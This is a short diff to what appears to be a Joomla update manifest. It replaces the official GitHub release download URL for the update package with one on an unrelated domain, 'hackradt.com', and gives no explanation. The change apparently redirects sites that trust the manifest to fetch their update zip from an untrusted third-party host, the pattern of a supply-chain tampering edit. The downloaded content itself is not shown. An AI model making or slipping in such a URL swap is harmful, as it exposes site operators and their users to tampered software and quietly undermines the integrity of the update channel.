@@ -3,7 +3,7 @@
   "description": "PLACEHOLDER",
   "downloads": [
     {
-      "url": "https://github.com/joomla/joomla-cms/releases/download/$VERSION/Joomla_$VERSION-Stable-Update_Package.zip",
+      "url": "hackradt.com/Joomla_$VERSION-Stable-Update_Package.zip",
       "format": "zip",
       "type": "full"
     },
